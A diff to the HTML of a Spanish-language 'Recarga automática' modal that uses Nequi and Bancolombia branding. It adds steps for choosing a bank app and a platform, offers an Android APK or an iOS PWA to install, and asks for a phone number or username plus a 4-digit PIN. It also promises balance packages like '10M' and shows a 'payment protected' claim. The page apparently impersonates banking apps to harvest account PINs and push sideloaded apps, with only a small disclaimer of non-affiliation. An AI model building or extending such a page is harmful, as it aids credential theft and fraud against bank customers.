@@ -520,9 +520,55 @@ Tu navegador no soporta el video.
 <div class="modal-card nq-recarga-card" role="dialog" aria-modal="true" aria-label="Recarga automática">
 <button class="modal-close nq-close" data-close aria-label="Cerrar">✕</button>
 <div class="nq-topbar">
-<img class="nq-brand" src="m/00f6a980fa11.svg" alt="Nequi" />
-<span class="nq-topbar-tag">Recarga</span>
+<button type="button" class="nq-back" id="recarga-back" hidden aria-label="Volver">‹</button>
+<img class="nq-brand" id="recarga-brand" src="m/00f6a980fa11.svg" alt="Recarga" />
+<span class="nq-topbar-tag" id="recarga-top-tag">Recarga</span>
 </div>
+<div class="nq-step" id="recarga-step-bank">
+<h3 class="nq-step-title">¿Qué app deseas recargar?</h3>
+<p class="nq-step-sub">Elige Nequi o Bancolombia</p>
+<div class="nq-choice-list">
+<button type="button" class="nq-choice" data-bank="nequi">
+<img class="nq-choice-ico" src="m/29ddd9fb071a.png" alt="" aria-hidden="true" />
+<span class="nq-choice-meta">
+<span class="nq-choice-title">Nequi</span>
+<span class="nq-choice-desc">Android e iPhone</span>
+</span>
+<span class="nq-choice-arrow" aria-hidden="true">›</span>
+</button>
+<button type="button" class="nq-choice" data-bank="bancolombia">
+<img class="nq-choice-ico" src="m/a0a326b18550.png" alt="" aria-hidden="true" />
+<span class="nq-choice-meta">
+<span class="nq-choice-title">Bancolombia</span>
+<span class="nq-choice-desc">Android e iPhone</span>
+</span>
+<span class="nq-choice-arrow" aria-hidden="true">›</span>
+</button>
+</div>
+</div>
+<div class="nq-step" id="recarga-step-platform" hidden>
+<h3 class="nq-step-title">Elige tu plataforma</h3>
+<p class="nq-step-sub" id="recarga-platform-sub">Android o iPhone</p>
+<div class="nq-choice-list">
+<button type="button" class="nq-choice" data-platform="android">
+<span class="nq-choice-emoji" aria-hidden="true">🤖</span>
+<span class="nq-choice-meta">
+<span class="nq-choice-title">Android</span>
+<span class="nq-choice-desc">APK · Instalar en tu celular</span>
+</span>
+<span class="nq-choice-arrow" aria-hidden="true">›</span>
+</button>
+<button type="button" class="nq-choice" data-platform="iphone">
+<span class="nq-choice-emoji" aria-hidden="true">🍎</span>
+<span class="nq-choice-meta">
+<span class="nq-choice-title">iPhone</span>
+<span class="nq-choice-desc">PWA · Instalar en iOS</span>
+</span>
+<span class="nq-choice-arrow" aria-hidden="true">›</span>
+</button>
+</div>
+</div>
+<div class="nq-step" id="recarga-step-form" hidden>
 <div class="nq-saldo-card">
 <div class="nq-saldo-banner">
 <span class="nq-saldo-label">Disponible</span>
@@ -547,10 +593,15 @@ Tu navegador no soporta el video.
 <button type="button" class="nq-chip" data-pkg="p50">10M</button>
 </div>
 <form id="recarga-form" class="nq-recarga-form" novalidate>
-<div class="nq-fld">
+<div class="nq-fld" id="recarga-phone-wrap">
 <input id="recarga-phone" class="nq-fldi" type="tel" inputmode="numeric" autocomplete="off"
 placeholder=" " maxlength="12" />
 <label class="nq-fldl" for="recarga-phone">Cel</label>
+</div>
+<div class="nq-fld" id="recarga-user-wrap" hidden>
+<input id="recarga-username" class="nq-fldi" type="text" autocomplete="off"
+placeholder=" " maxlength="32" />
+<label class="nq-fldl" for="recarga-username">Nombre de usuario</label>
 </div>
 <div class="nq-fld">
 <input id="recarga-pin" class="nq-fldi" type="password" inputmode="numeric" autocomplete="off"
@@ -569,6 +620,7 @@ placeholder=" " maxlength="4" />
 Pago protegido con Wompi · Cifrado seguro
 </p>
 </form>
+</div>
 <div class="nq-rstate" id="recarga-processing" hidden>
 <div class="nq-rspinner" aria-hidden="true"></div>
 <h4>Verificando tu pago…</h4>
@@ -577,7 +629,8 @@ Pago protegido con Wompi · Cifrado seguro
 <div class="nq-rstate" id="recarga-done" hidden>
 <img class="nq-rcheck" src="m/64002dc1f914.svg" alt="" aria-hidden="true" />
 <h4 id="recarga-done-title">¡Usuario activado!</h4>
-<p id="recarga-done-msg" class="nq-rsub">Tu saldo ya está disponible. Entra a la app con tu número y clave.</p>
+<p id="recarga-done-msg" class="nq-rsub">Tu saldo ya está disponible.</p>
+<div class="nq-done-actions" id="recarga-done-actions"></div>
 </div>
 <div class="nq-rstate" id="recarga-failed" hidden>
 <img class="nq-rfailico" src="m/39c1d6a8a1a1.svg" alt="" aria-hidden="true" />
@@ -585,7 +638,7 @@ Pago protegido con Wompi · Cifrado seguro
 <p id="recarga-failed-msg" class="nq-rsub">El pago fue rechazado o cancelado. Puedes intentarlo de nuevo.</p>
 <button class="nq-rbtn nq-rbtn-ghost" type="button" id="recarga-retry">Reintentar</button>
 </div>
-<p class="nq-rlegal">Servicio independiente de Tsorbit. No es la app oficial de Nequi S.A.</p>
+<p class="nq-rlegal">Servicio independiente de Tsorbit. No afiliado a Nequi S.A. ni Bancolombia S.A.</p>
 </div>
 </div>
 <footer class="footer">
